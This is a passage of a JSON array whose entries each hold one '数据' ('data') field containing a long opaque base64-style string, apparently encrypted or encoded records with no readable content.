        "数据": "inV4oS8LJz7AYqChj+/N+t/ynalXCn/hzv91Gt/wGoBIWy3A9oPTHdN5yEjgMyAy6uTg1BOi/KJLIBq7dz59VoZs+D68+DfkMD5j5ATWf2zHOoJR6ekVmyOFFnFUFO/1IgYqiV/7ZL7jJfFMiCXdC5MKsSGfKHocPMeWufXPrCBp0/ScWoiv+fcX+13PQD/NCxAxvZB72BQckkChb0hFrnRoaIbYZdTN2ezFIbXwkC6IPtbcGVVQeF2k05RjVskbKqOzkAxgczqpWPsMkZKb3dQXKxqwceFX73odZ7SZCUqKVCHhBorTJFztMWkjxlEspGZqpnuLSmSZgLpuKD6pA11tmm+lYtaGHltmHBGIeIC/kcoR/wiDZptxaviFnTd5Hi2KYsfVA6PnHvepKfhvQB9WjB50gnraHrlrNob8WnLDfyd43Gvs92GqqkxT7oSg+bPVWREKiRVv6jXnjwx2cDpxnh7w3OEq28GolKSrs0vMKGUc2t3faoqvMwWqFlzc3GpXpYMQx0C1pTCEL/YCUruxGbSb1lLaVeHKLKOL6VXN9emoKplHoly17hL4mvgbLgbAmBLL6oiX/lNWsWO/nFLVfvxJzeUt"
    },
    {
        "数据": "IADCpIJKHrxQzFG6xhTTlnR1wkZf89udW2uDxGWqzUSU+iVfBVshRxPlm29lTCo/Eg/7zxtZVPFS1iyDzy6fjqfvps0cZFEwG05DOpJ39L3DZjXKPHdv67WBvXGBq9gYfhJXw12nJEu+BxMKFckQ03oG1fdge4qtqmvuKQbETHKUTbFgTh5nXNuzh8/kJeEvsVF5NmSAkBkE3s9UVnMbN9g1nDcegU3z2WHCOw+yD4LryaOOVcM9m9BpgrnxbMGR5qhbI+tpUqjjt+qEsqbOLWMkQsMW8aill1fGni1dUsUFztKtSVmg5u2MsjUKwX61W9keAM2B94jc8MtzEYJw9kjHBmOlIHwdEUu5YSBeF0DqJnJ5oP4P5OYvebaMebbSY12fZYploj4l932Zgf3ncVX+j46aHClzOtttDeiA1BE03M9Cy5xn/CpDROxRgojjKqRDkJMTEQxjtZtfjiPrw2vcm5Eq1w4TRqXNCZRfp0Fa9tWkdbTAL8MRSWTfUE8o0IwU9xr1Gndi3KlhZeX4+eWoP1367Kmqf8oXs8ibFoA/gdBPfGES7WC8C2zar1hax1UNuVXRat3mXPEx6bznFiYLv5yg1w=="
    },
    {
        "数据": "R+WiS/CQ4axJgxPQ63Ejf6WtwwLXU5KrsaAD8tX+MLLbtR5lNoRB5Fs+yIH0bC2JkAaXkbgpEPcXP2RPfphI0dmy7DvFvm7Ja4YueLUfGeL+4y0swQOEH7J4kYxexPX3a5WuUS+DwdA3huOLO8jYgzaYZlaL3f3SUBGZKfnlmxjtWRq/BBjuiY1Yqcl+0cEikd2v4GxqRj3rDx+XRrOp2hP/pp9Btv0z0qneq+ID/E7YIxfKy34IqMBhscy+a6uIm1kB0HZQ7NpHRyeFzwZG1j36J8Lx6SI9wYFCW04+wbMklyjt2tjIvWNjPP+qx4itOE22QtQN5b3DxExbzoJbpeXS5Z1urqDKnrNBs0y7awUj/LOjtFcMn0c8YidqXh4BnrxR5wQ7uzOleeH9/2ZPp4aU+Ze9f7dzETonLXRJUxSq/JT4t/b/vrVe3nrMtr9F9fv7+gYpFQTPI1+WnWnrbTljRaHhOxRV2ukMo5MXXpHqWKNZUwECtBKESGIA9MNwqKMeQX5cmFvkmVcsqVYZapSIYbN2r7C/Wsh26AqVYekXIWK7NkQqKSf/m4892fdBzbdAeilQF3juC0G7QFsu4OIKrHY="
    },
    {
        "数据": "kSJv4I8KrY0QyyZJOLaykIF5iANgZYvkzSc1lEUhaxomjVuTvlXlU2YAzgwZx5bgtHMboxqYMxXVcLkoMrneZOXqplnsXQJJBKGwYrMkVwN9hsnOi8HQiei7+gCrGo2dl4OAFZD9yT2GFgJQGjvzB7wbT35BY/kawi51/DM1rpaQOscrWwheVFtWDh5VgGDXyQmdoEXPzRWwIJIG45XS+WVxxnP66kfGgpbSAYXKqbTc6ji4BbwVDzw4BT5WsxyY12A2VZG4YYenKvyciTjlvOebYYsqOtXnGrVaPRK1kos9XLEybfdqRcXlg+ssWezHSMAnjfNX8GjT/jbmpTKg4C3tUpW1mvXgb5voqQhBvHVKk4PK1JnUp/a4MrUpjSEUPunpV/1A/Mc165zXSxUFz9WTj15UEMMoeP3E5d16tvTQ86xt/z0dFVUeNJ2OpUnt4UVU3WkwMmrbDxUKNR3bVJx3MbIDzqas0ZvSZw1X1jkIuJDbrg8QAy4Xb7agZCau1AdFD8XkY1RRR3OGg32rdPXHVSWqG264j+GqgqdEimvH1d29J1Pr//VNTzHgPlD4g2y8vV3zha4YayuzmLjvlODln1Gc7kYiLg=="
    },
    {
        "数据": "840sHoNAvcR7tCtBni/G61JTVd1eOYfVSG3AYoidMhX4PVMlvfsX9tEtbC//0C9fLrjvQaxSZF8+JvkXm1LT0JszTtxz5oBV/o3Yav6QkfcOfamAIP4MjjbJYB1cmkCidQdTCv8KeXLCIE8D98RwZxSiwvO/JMDlwAwrDSMMKcR2nTaALuWn8jLDMEBh4hNJe1Fo89A5Pu+9RI2Mf/sq7olEsnj0kStoDBzm4hg2hnrVD+IJF2Gd00j6M1GwyHREcRVyMoVVFRwOnxxbt8Oc0iuFaYEu0BMiz/91sGDnQgYSjlXfOmH8pR/eMa3LPJwhHk3qxyx3Ys/qOsg7KtWfl8AvXBrfC6FlbKu0czQOLi8e51VOFGtuCSFNyzRQgdcqUYxp+we/TC6J7N4yrKvoHSyA9AdtOcViFm6pGwsuJ8MHy7npSoRqj0JyNOYi92brhaUKtpahCyAm4dfHGLmjBPI5INLdGxHGais5Y6f3Mwy9bed1jbxiCMbsuwqwlMHdVXu74fQ1HHpt7r7770qxKf0M31tZaGF2wiSsfexKdde090/Ick9q2s30YaR7vk4Vr6gAef1FOOL9jGs95aiOF4cr36dNDoVTJFIx1RCSh0EmrnJAtABSazQ="
    },
    {
        "数据": "L5GtOo8Vz0tKx08dG7FIvnmeMGeJQwP2/CmBoLJbbebFuG+7GRtRX6WXXnpOBNRLQJ5xRPCb555l/reGco/JXH7Tc5PzFk+QeOfqeZtTs8g5EaPE9TOy3JDGvia7BYL1xvfswABjy+Ns+qUmtW6M2x5+wo9P1nyYPQXl65bcH1e8WyPhxBsSlkflWzYKuJXxfX9JEqjvqSR3tgK2rm2pl1EIg5hJIVnNlvEHlQj05Lm+vQzEvTVwwBVsvFOpvFwxTJvCHeYJTGD8lX5JbYZVnL6UVXHI5DOyA3WZ/Pe0VXNlQVt2bnfT8WUaDamMtF9sPmsJ/35LUYXdKnN+OZTgMheXIkYIUh3jR1D+YCpxl+gbONwaoMZFgVSOOAqZQyEJwa7OhPVYQpoGBK7As6hCW50IbLVrCv5LUIMGSgxWelOeJ2uApYCj+eUJqqrHmcoQXzBa7ZozejvckVCLxzsdq2cVugqxcNXvfcKlSMinH6uLPgucbx4S78/ELs1Bb7VnwRCtCMUnx0VNHI1VfK85jy1yML6aMUjMx7WEdDwlYfjPtl1aeJIdL4eYRFBrRzPu9Mp1xhP+6rr+R6uwjL5tj8Te/yV8Og=="
    },
    {
        "数据": "RUhR7TuGNXkrTDnp0hUGpZOYB/67krqfNS8WA8rpp+zRovK5UXNmA8KJjB5HvRttBiDmnZb+zRiDGE+cTPGwI0q3yxPLEHhK0f+yPoDSbmZ1xGCsM5/JJ02HlGSiSo894fPB6NedQ2f8VZWmNSuQpEcz7PvbWkFzx7bABRqRdBLk7zL0cqAMY/UkuL0Hy312Ok5aafNCxm20+No00JEIaEMVBNwmyVffoJe0YMx8d8gpjQXOuSZiYWJcPmgZ4QDRQSd6XXAa6j1l8tbWN9rcsL0Bdpbl7CahRhr5XtI6GEvR0z/8EfKf+GYrld7vBfmEKsCkaCjEvR90XxyvsE5+RZGX3H5hIxtVXcFEdk+GGR03T2+cjmA3VYHz/CdEsuWRDeprj0Xe4BKbonfcsuBhTvukHptFFiln7VDQbLU+hdr2EcVwuck8ONExhbLtwT+c80X9ysDLX3ablgbhxOCSr14F172WEPEIiSi44ORij0m8nPGKbu066HAJAxOaMnkSWlT1eHU6b49xG8YEYkdIgKGk1CAfGdOQUHD7kPlchE4fKvehFLKQRTjoI4/HwrbCPj6R+ypwf1Oiei+w5T+Hw32Hbe0ugmG4hFSus2NA"
    },
    {
        "数据": "P5UPrdQ+Z9y0DNu8eAv014DQ7NgOhSiNmRCV+S7sJbRhtBSqEp7BZuSRlAqYFRXF2+p5U19FpZbhfiSZnueq/E12xchmEI4vYvOq86dpik3u9IrbBuwneefXZ5HaplZYPRjFJwpADQua+4ZKuc9yUaadRZ/9BI2T4nre21ep58YEutVV5dpdvI2SwqpiBE2ieY25J+/VYfg15dLJvs8u842TitJV4HZW22cum/N+c8JviExx+ytgxiwRqBhddSTzqt0un0C8iZ9uhmNQ6hpixmNm5ulyJAWCb6hm7TifsAzu+CcaYn0dJ+1sbNC8OU/JD+p2fh0dZAmOu8/aCC7lMlBqU4/JEIDdP0p/FoDx7JdpheO/wwM4eA2F6SITL1qWIjJGiiVSHum8AgdStlm+JDw3C0a3akVuyrJxXJ7UVafHztBnl6lmFOoS7jS3qxWnOsQWDCVw7XbJ0kibGEl+g5cImfOz/A0TwYvTNlCjZPS2h7AS7xEysBKf9NRQBgfMwls/MWnTWZoGA1mnq28YvZZiredTuPJuhdnPRcoSZxv5UiIaPd9gkflxIC5aHRcBbsV7Jzeps9Hw+mQwDW8duEBGcSVJ60rvFCGZruCN/CwfYyRblOJrYk4="
    },
    {
        "数据": "jinL7Xse7EB9LOsJqmnlfWZXL7WYVuNWz/kpSGmiiIwIImB7qZ0lYhC915mekOlFTZlANuxeHogT9htYx0zxa0Fru/Yw+KUqQJUqpp2Qu7ZbpxBUXvdvXZtNGnryTDoDJi5KCuuY+4wVGAdQy4BBcUN/esTjZEfaDm1Kqvk6ElKqUQ3NPP9VhPP86eMarhELz6m0BDua9Yr2iiqxkoQAUvcrUqm5doj9xAX0/LepFqx06kIPlvr1CIbcbib2yEfQwGAaAEFHibNLxkR2fubPk2o4YdT4LnBlulpkU6zH0huTdeLBmh/s8sT02h3d3jOG4rP3ubBfY056iYCy4eyxDNSKJBqagtw0NSiTMeprL1d7ZHw5jGalt4YDkDJqltMq4UOO/TC9dpUrOuaAzNvX4yZY4rq2wrT3XVjCBwy71gCOTAxb3HwQ2tkA7oJ4wEdHX6WXdpsjkzUXZek1K21h+76LSh7uEccqXaBFn/9T6/oP6xYmLksNdpybwfMyrV3xLwOYOpUASLrw9L3Z/7g5uc06ZiyN3dBLhnhcTuR7HHtP9lz1RZ+Wkak5bYOtlOUq0oIyvam8hGHT0s029LKZk5AanGhBlg=="
    },
    {
        "数据": "tVKdEUw/Zb5yUx5x2AyTfwo0hyj/bOAbyib6R5a+ltB6jndZLnRcdSmomTExR7HUpjZBBn6fHgBYrFElCsScv2fgg1UdBgYBpaYZtB6roaj1HLPGNpfHhzTcWYTXANKLihcQjGQrhdKO4iWCpgDGS6izcgDIswS9I+BNlN10myrvv68EzKMNcMZ9W9Vh5dRcR5gdTney5brxYPIRURCepnaSeHHEysQSbPm2t0UoozPBjBnJBmrAI+fuAg18jDRNZ20uXve5x4RwB0wWGNB8+Xzn2LeYeAEMKkgHwP1iKjA+gBtbr66b31GxROylECeQeCM1uVqHZ5C378duUvYSRjiUzJF2bLLG3gSzj6kxPHQqzZGoEfJSJ5HVyhFQx9FQDpGKyk0NqALUUbYwPP8uTkZPPsqlxRx9ZKVpZ0YxsJ6XPf0HuutpJoAI3xKTFVWeeG3quX2dUEkZqUEaTyeBNQGFh8P1v6a9IsEI3+n5NcN7+tHrdt7/Tw+9oVWQHmg/jj1uXExUf1wABc0pBOrAQIlEdzzUyKCWRsmfuPTidPi+cxCSUQSuDkniOXa54iCbQM7nlGN5yghir3MtaqmxoOrvgROTknzRusuZ2ck="
    },
    {
        "数据": "fgVhkEx7d6yqXzxtRcdOb4ecxCiift4LhmbymIYsdDoairKLgGE/g8PbTo6tOQaJ2EHNGRvj8POfAI/jtwb+X8LI2DnKOqNWujzSHDAEEcj4iAnPs9l1TypOKoWok3/eonoG/ZfN0MkqoW6rfJ80Ub2pLowt2E9bFylPrbmfH9P0VHgRu5IihfvLJLtYICOs394sSQ/y63P78bMvb+yNkHmWjeGcOhNlLeM4QFtWYQUiwONS9kMM+a7DmD6Uo76zkRt8+s5oNLgdU3sbXL7fvxm2ef8B1kZAevZ64vAI9cjjnWpvabchKpXeDl98szqQZXvjQ5qbYop6HX1P92JgYOTvZ1VwhwbXaxjTTrXCBTy1cLgpY+r0qTRZTir1Ia0pGGMxH7d+YtA99D63IwxSOBzOAU2NTWYsmTqtkqM2sC7uIBogwGAZcalMihnbrsUB+1X/2/Xx/sF2WVHAdhkscN5ibhd2krFnsdTDl4z708FIpOVLhTqgzj1MA711sna1IpIo+CIULiQj/6Sfmga1+zbp7CVXItjkBCFrcAKZvQ026MqbAZCM3R5owBix0WALLgv9kCT6Of1RNYRd+QkDN7FExwpZleo78eo="
    },
    {
        "数据": "LZ6oPPR/cQVhAZu+Hac+6y0o1oy4hp+G3ZutuUNgwaUuIGVsqngNzLzVaX8hpXgFYChfs25Oq5goA8euXFVEE0nDlIiHJq1yC8ccum9n7FTC/ymmKZpogp7qVZnzTZDdnzFTS0VaPVpln+mHTnJyzia+udYrB9mxNrZy1Hf5+49vj9PIZoO1+iHg5lq3HCZb1TSe7d4Teb/XJpYlGuMnTIv8X3Suy4SHddE3d0xIYccWoV8W4lleda1uWD8FlqMxZkkzpRkN2LhH73+znAF+S7yjUxL7BvZTEGDYevwbJKlellGYHLF/M2nEmx6jtJouAMPyE4W9AwmRJfTocDzql6F4YnsuxlZG3hboNqHlUzCPmDYSPzQnXzUV4pA6d1LKw7kjn4MgQ17yWuc4yJzYEsKI9TFi50IPsvx1cjKXk4Yh6tQVn6V55yC/ibNlBAOz1SCnygtVJSfD5gbpuDWg3jFBDVy/zAahEOnGO6dwsZIiebU4L81tsv6E12NhQU+3vFEmugK4k7hLO1AdPW4cqss6k4GuaaIw14nRBKH4k7czNfV+2PH/kfrAldVVYpYh0QRgeG3aJhgn4SpV9V7Q5bRtJcJNvX8="
    },
    {
        "数据": "pOh4f9v6kMl9iAVL9FWzBTI5pn2bE4vjHdeY/z/LmaWOIiSrC0TomXXwl8EcQFrtLMPmt5PmYhPeSpqQGHDJnyXNR4WyWv/vgDtc9Ia7brNLxNwKUF5u4ORIidReLaE1YIRh9ZyC5UYVq4LSq3H3SrZNwHf7g0sfd13yj02uvYyvlFbFQ9b5KLcHfGmw/EFzRw8oVP0++ub00Wr1lnKq8m0MZrisu1FiR8+kIglbdHmkDUm1P8GFcFYpxAmYEDnOFMY1vL/vgfP7HPAVIDxplRxungL6rtCVL/9xgg5ZLxmL5mikEOw3O9ZkzSyyRKaWYBBGuT2ZtoaT4zmy/8LiXsp4+OZHyZhytdWzMQgJht/haGSuNqgytc7qRl5v3b4mUqz/KrZU8GmxrsHTlDAp4LCpMvE9u8Jp3vwQuhpoLpn7dI4KJ886T+FRv47SEtpLWPW5hjHrpuG5uxyEwYp93APew7js6zztH9ikc+jpmlO0JnSu+Hh9vJahm7qll4xaMR6bClLBl8kic8qhhGi8VYXopJRPoYAcr2IDPwRS+yxwvdvAQg2igaTLo1UTd37jaK9UDZwtR8aSeP/2+tklUzo="
    },
    {
        "数据": "rA4ebSSK0xz03z9OHnpDgm7mJodXPafDpsQwYrUnJCt3hEdJJbBfZJ0d8eI3dzkLzQmUqGzFk9GvDFIcX499fCljbHfu5XOZyAI/FlWtzLW98Zt+w+qRvtmfeihfgovlh5HAdLhSBLTK0dx7FOh+yYEG1hGG0Wl0T1XuPfu6aCxBp/mis8yHv38eobV/TxvyBkJkP6O+RPqZe02jef4JjjaMNah3RZjScPM3kZ351zVAJyV2u15kvPryYbJZ2GFYOphOlTVFb73wn9DiqpeXWjFvHkwHP/77tGkmxL0tmhyloi8dF6DU7MqtXfrXTe9vzs+TV13Mtey6B+OkDb/1EDLdbsk5/76aP5dfmezYDl1Dr+Pl+oWgjwixDqCo7iB5dvyagD3rW3gxWTmdPLhrT5YW1OuJV3tHOIePUz5Ed5TxyjZV2Pem+6QwAiqN55JtPS5U7zpAfbyPCfUX+60oZ7PPzjIw/sagbgv6BB9MYOqO46PP96sUePH8aFYcRhjqnmfLbjw2kYwgyFzV2LwM3WoRVl8DNTkZ1qKp+bz6WN7amR0BQzSrlk6HZDeXQ3GoFOcbalwmNvzJHYhI9S7ZdNzbDBqN"
    },
    {
        "数据": "wB3avJkwleev7tt3QXBycZvQ76vubmDFOmoV1F7e3la1PaYa1UvJPpxtrQNut6TU6NG915LAkylkeeqzU63wYITIvc4JKyExMKGeJyHBmpGgyL6xaN/NIMTDFvzd/pg1VgHfcRUXUB3H1pGwflmrtaZkArS/oRPEBhe8svA8fi2lTGgDWazcB5D8eK1QlJAOO/isq1csU1O82GBeY3sgvWyMum2eYUKB5WBcOfvrWWvvuB6qljGih+7RWoTOXp8iv3jWGF2eT5h6sC6s0bMpDDn+j5yWrB4Idf1RX68yBsDK2DuUJtoo+GRnPKdp903b7W/F9YarvrLV0Of8Enw6Hjgd34v2kiHu5Xe2lvRUzWW+sgBo308fctIWV3eNEgUiLPw6B06t/kU8xqiuUVkxSr5nH/+h5prm0L/oHGCUiTUarIU6z1OfUVy8KK+8Kvyq/6n0jJ72cQqkrzMpkt2BPJ5MjMXPVd2zXzpb5EUw4n1i54MiERh8AgWmQ7H+QYja9SWWiasE+ov8AWPbUhsRoTU4TzxMm32MI/bQBE83bNHL1fMPmgLJQKDzXzMOGYbuBc5jNTThqIxiCzDQlK9OyLZ4d/7INcwIUJIp"
    },
    {
        "数据": "Dbzr43xLVyDTmw1Q9vH4IqtAkOq95lLR/gGBDLEFaY2Zedonmve1mYkve781ConUhCnp7mGjJs9VtcUTJX0dG9DzTYVWBHzP08hASfhSn6wGRyHRXGE0/bdrNMQUzEtRPQlFVVoYbwMqUfe/q4fQIs88Y9DbMiTJOTg22OGFMKYZXQeI8JmU2XIdeR9QT+IBxnnWbMZ4Mm0NEL5qra+0z4Uvunam/nXKfUJq93bhNIkF7XjOQEclNQcXroKYufW0xyx84/blrYMNC52NZUQLuZvfJvjDaXBfGeLfUkkA8x5/Y+8DyeS3DuK9yxeHgln8MPMPch56Bcj/625YXIBehgCda/4ShNDwnZvjjC0B0C/2LoS+mB4sJNYYEFDJGNBlOjkF/6bgL6cAcg5bB+zEFWt6IYB+of15/zqlv3fOcsJ1CzwAAUBq2ttQ/5GuY8InvZ34D626uker1lL0LPrI2G1EHpwu/IH4LSu7i9auDN0AIh1FKi2D2Sc95DzesYgfJ367XwotrPt7aBiWAFBWnpGNkytTVbn/i93X0a4zatk2uRsD8eOsA6q9SB8LbALHsE4QMcYQAm88mjFxMJtVmbJTDwELbQikJtgr7gLpP63NvA=="
    },
    {
        "数据": "lTTk6u7LGumjV2kaiYYpdRNrIviuEF+zzFeqG6S99wB/lBCiLoPv1iwNukPqzrJx8ffZq0A9FTu3QC7pCyDU4hIvREwc4qo1AEgCgGimW4DojaXbGM45o3xrAE5w4zdhDYJuSNNp5L+Yf9+/hibiYJSFmeqd1uUrNY87NB2P369omP6VhAs+OUCPfVpvzJm4DsquNbczG/tZtsLVlg4i/bApTEf6l+sk4VL0SizZp4mEobeFxW2MVAr7Dfqct/sYvnVHJDw3d6KxNFH21/0o9OvQ+d0dtKOoSAh/El6i/NIHDXBwnKGCGQiTp1LN4BmoDku1IXG+74dR1GBVpadBNpnyEtNIOhAmtywcKpCT4e+/rSVn94XvSiaubdNPD3zXwTvc4EJYR3cdkX3bc4b555c7oIPGDV9eh3wtdfFV9yPqUFp7NYWFBK0C3ZKaF2HD237BW0ogZYhvQWn9wtpeJL0KazQMVZXPKmwd1Wgg7/LJro2NDOKmLBmn2NbjWtq+6epf+nMHDD36JJPWn5Jiiohx7PsfTGbeNYno1RGm0DTRKTLfiC2rKK1JmnDZcMxNfuD0UEyDSxgQciQFAzASldmFCtd19Og="
    },
    {
        "数据": "XvT7Tspd254A+bodZvff/BMleT+r8StYPcXij6dpxYT7L+sKy/6xuZo5ndNiiydiPgjqCiPfzkOe6vMtHq7IN2eDO3u3P/IPLRjmKUFGcORgDGUYG66M9uD9oF6lHGuTLKQx7u3c10SqQLs/dOGYd2NWnIIU5eg26IkgA/PTsuQPjbMUtC74khjYKvtfUUaN9FMCJm0jDODa43OnixzimvXRY46LT5BNeNkt76CJhErErytvF3TBXg87iYmn8W7hWuYqDOtyHuwOxs3RyHQqncv61AXaq3WzVwraUWOXLOBB7gKMCmRDBmymEgztat3Y8UuSM8r10zcazAtoaAdPF2HQnLGqQLivW2RB01m8QulDq8A9dLNX8ldO3MMVpypo29reQXcVeTXZHhw0oB0kHuIEm03bJvaKkKw8MaeQ7dFa2itUCtpifYtmuNqB9AjFIjMspnVNaJoZAQAp+wI1hiz7exKvjWWUdUm8OCF9sWErC20iU5gAkS9lFRd4KrlSF8RwZMND+SSDu9WxT6wtWfFkARK3VdFSNQAtvPrYmagzIoypfFQr43CoRigYyImAiyo0LPn3eucZeFYzzKa//gmFf3fHmCE8zeNOL07BdJ8="
    },
    {
        "数据": "WZrRKrEAaDd2QyId1rb6n67nK0i2BZAG2/BsRdK5iXfMVX0fc39IuPPzZh/LlYnJhOdDKf9CKgE7UIWJZY8nhxzSxSWg6n2h6hBa/coJsqzjPzqmiZSb8NCw4fxRP+IbN1L50+LQYd6DsHQ97d5v5dj5IEvKruktljBPU/thbUyl8X1sifpAdgw8HkDav18NOVedjS7Y5O20U9MDhEOFUH2ZVWd5YHCkVyMwrogighg3zfN0ome6VqWSvEWgvN6o1/q2unpQ8T4TRqzikkT8LoUlADvzKEnA96271PP6faFx7BAF2ui+KwJoCLzDiOGvP80hM1gtJrvgc40AMA5EhHKTAYijZQ9nTS78Kj0M6LmctrWkpeEbFmgDd/d4vvOFRhsTGX8Xbpgn0xuhI846q4HEGc/2uhubBKyGmhZ2W3oq/+sYlA0eisaC9QssmGmrciSZqvp5uVd1NxPo5smkzoA2LKllIY/43iR5+TbcXQLdnG1p4VObAKJLKpTo4/CH53bJYwXxTgvy5LnFr7ZJKs2VqVKFRRBvkb+YZt3FLQT1nNKRgL7Iopz52rEZmF7jfXKGICOUQcnVlnhWkxvrdXSjlkQFzEQ+9nAqcUcIiA=="
    },
    {
        "数据": "4/+fGNxiu0sYPzNlDqX455NGdJpgA3+eU2P6l+0tMNckLmXJ4eu6DB5hqu29bAUQkV+hbYwVFVcQyVgcAF1TZthQ4AIvoq+CcAQH1NCrkGJKS0hYtMIdg9iZEWnUeDiOcshWfOhRo2hRpU3obd3gN2VgulVhPOmEIiKfgsgzQMsuRErCJ3XVUP6GNl5ZMjr4BOWndg6NZkybKKxt/bm0S/+qDENzDyBuAZ+C2IbhWopvxbWVCd37iV1zj/J+YmtLragtOzOqZ1eXqjtkJfsDBArBuRMj1SP6HepF5PXhuRuOl9FzUHU8LIOV1uKubNr9JZoKn8z+o5KuknAYdEXrOp2HE82Y5s4naOM7T692tA8nXGBDJjRwSoeAomlKxAggG5QwwotUWHU90lnhhRo1f+K5iXCQRb5CmUmQnEq3MZr3PgAcj2n/H1hb0WrOKpUcxNDymm9XuuAsr7zfUL4h4b/syiVqmjEeyzn13G+C2GAHweyp5bB5KWF0S5r7FqCk9LLtSlao8hY43/xuIOfXFXxm7ksuoA5FBhWQPf/3OW9s9/lGKhuto42gGkxuasptiTJWuyRP/Kuz98rCwcdwzaqTSpsZSa3QngE="
    },
    {
        "数据": "3l9OXyiqataYcFDy+pxFzCVM3X5yHp97dc0WCcbKQ7tIB+HJdITsBNzpeT6nrtHcQgbQHlG0WO0P2vuyJzUcSR7aFgnMcpDJZj58tpo5LIr6JWesw8Rdc+4JpqHg4rn65JL0DC7r5vxFrRkmEcjqTECQRhuhQ/GxOhEz+kW9GOX4LSfdyc8cJ7NircTwcRbdWg1YrXUwmHV7pOMTXTZwRm4Y+YfUhlwCE6i8dbCzZ+14gXZKwXOOlE+fnGU+PcDImi48p8XtElEv23e7Fy2QTtDTKuosGSVhR5ZesZvPRIUAJ4NtyAMxkwMVYJFnw8jkr782RsEu3PMjh152JM8ikhfYWx9N4WWUaoUd6KWaqp9twzcKbYemJUriBvkfIo2UqIm3lMaifunQYhGpLeETlMWAvisLriTDWcV7PDNNWzJToJqqCC0Y5kAJTBiDcdz9IkSUtrYwVQg1pixrHULa4smEo80MIriGdOikqlAfPIL48PTvdlyghu2eeagxmEiHqL7jAksIIqZId6TaAxPG02L70F9jHd5xvNFiXO0nTh0b5CeBhCBWe8P8oU4o7ItpjhK10xgzi6QoRda/14Q0RNvyXWrx+K7BIDjiXToT//ql1Q4bILzAXlsrbUc="
    },
    {
        "数据": "ERvtSXvfhmMjoIRqUJEIJ8mwx2LjWMfCBOVFBC1LjTf+W7QaFLJAvZpIUUWYRJ848PhyVPKjXNAeRKxGdQxw3VulHxcOv+sEQ7zhrEFfuszIIUaqrnkU2JzllVM1D1rIDQjV31/88FBCGieK70ngvjNr5UII3c6BA5KnkDbBqgutH6fssgQIeLV8faCWm0iE5wY3khGERic0oDywGcqQjXXLkMCCVQtvDHEgeQbX7il2MsT5kE+wwM+AWYbcb/ROK7HZcJCDM/AHa7y6W82NuIbrp5cBgmUfbVAJ2iRvb4bqXdlT/qUok8jKqTCrM1X9GOaKvFWt5NaSyshEMWQfps4iqgPirVsFAxQ4u8EPLdmiO5rsQ1eIQ7HPE5hb+RaWP+EAxDW/RxokRbd96KYHLToCQqM90xfJUQH8L7GRVW0jzJdGnYJydYnf5tOoJtIqHPSRjhMZep8fP3bcaZtvr9CuDHrbHh6F6ISN4Q2Oxp+nIe1eDUd94xW3yD8wFHacrDSwm6/ukp+Dao+6o+v2esm6ecs0f7MAJkBqtgeQzZ/7NFL+yIvJ9Z5OyHWKR+LRQj4hGSE3eQFG91UKqALGnkQcR6RZhbxxiAzr0FtHsegxY8VJ"
    },
    {
        "数据": "oUjx5Ouh4qBjWy+muWJrDu1jKBEYO0Sr2dqNwT3Er7bAafMfU404Sj+N2o7g6uRx774VCSplAyEWCUJG2ErpvSBP5TLPj2bx/FXO/+vopDUPsVdr5U8vki5RTgfr6QVWyiXGYdPyR9H+2pepOpaBcpZzUqt/4XGhOThfCQx3802R+WHAFtOe2EpwrLbRMtr4UP5b+F87mfZ6hfRq6HJBpZvGHTPrETBSNvGvJPJoenJM5s9rAnHXS/AmBINg9jTAeeK7eSoAUdz2qTErDNS+ctph05RrJG2UTaYnGR2KpO049SIrYiWrgFuI04NGXDKoIGkdA+N0DOsCqDZ/7sDfbXN88RkeBU77v2kD5+cpF8HU6cH+Fwlgi58hSKMYDYxDwhiFCkRZRT9dyGTiqrthVCHoPhHumED9oapgthPTqhP/KhZIawrXMq/ccU4tWvtEEKysA+gCIXVIHM2jYLhLUlMx/dgRqHzgxi4N0qjtvghFixQyCU7gK6osFJZup85P7vi7fJNHaanQsZIizyVNwy7R9vufVedqixP3YZAA+rDrwUdQr+H8k6LPyjdgZPIBVNqKFDscHByFypznCre9AfS2wb8U7r+dk38="
    },
    {
        "数据": "lMGGQA2MFI9yzHU18JWn0xgW+FUR46ScaKXR+/k9piBhZ25x1UUW/UrzJwPc4r/Gq+PeH/qslgiqk8tQQ/b7oRUZ6qdRLMAY34cKQi/ukH1DvAyfgrZkmhuUVbwXulU7MbrdxbbGdZSD+eYDpR08o8ae4MzEMHuSlzj/Hd360iYa2kZunUkEjEy5Kzdvrd1VAaUKBwG0u9bnG60uWUVkoV9j2SwyaMTGv8sh/5/TMK0Sfe5VynoxXS2+T0qLfxMx3xLw4SnSGTYmlIQJvLwNOyp+7NdYt4edQr+7zjkRGqdJqpXd+vY10anLPO65HzC5ABQnvMeT0rWEwAU/Y3JMJghgTlycxyYWbYe3GuRel3R+2Yz+JwNPJAlnoIxIpsIeoGQSDsdQv9HctcxA/uWFfVQuFrey/f/xuRHvTKIcu5rZxcKiCAyE5oxyPoJZ8QLHftBRoIT6Vs0UNVgAQvlM5Dc5bPBxFJe3XImb90TrKz0D0/gBTx3FZ7whRRBj1JL9sYDdyFv8c3DZ7DWZOgOgqG2znor0vFrPRpBgqz81Q5lndxAVDyUtCk7j+Ab4lefdVmK/RzkMd2JtarfMy5T7glLmxbyjHX28t6Ip"
    },
    {
        "数据": "6PUqRU5m8VUmZwQ1TSzDY8TR0R6PZE8zLwLoYOdbXvPEvYQO8SVqMyLXy7ayZj1WfnGDxQeuh90BrSti0Bzv3KZngidqos6DpT23P8h3QNEBCrwRss4yeIf9JUVMhO7dJ8QaVMZqMTu2tOmC33cxABzO3IE59gZJyaNuOGR6Y5lqGmWKTwtqZA4Ijnm+aZlCU4bPY+KJnAvne4jNmJsLug+Lr2bFbzKTQPhhNFBNHBlIB/AbPwvopECrEMtIFWPdTmrrrI3qYw4pLEj438ckXMmW36xEsv5k5J0t9aoRQHYSF6I1m/Azurrw8MADlOUwlLA7awtK7u2Y1JCIWwBClF1EY00BB3kN48h5DR5XvPHUG7VMXEhZ77qXmC/cDnOhPqIWg02oMu76bFJE+mz66twcxl2ehg8GhflPpTU6BDyqkXW0YHYH63IKvKf6SGH2N6OZkUH++4JFOAfHZI3qkgNsMCCVVe/TF0nPwdtbfR1jvVTBjEhoSGwZLWrcuvH6Sqb2NmpbFbj1Ieocg1SFhEcOZNkEmqjebnteLZUfV7WVtr/fZGhAnhj8+/6e42+AmNvcUf6qSd6RNAu+hnAaZwfV4xDt7NWk"
    },
    {
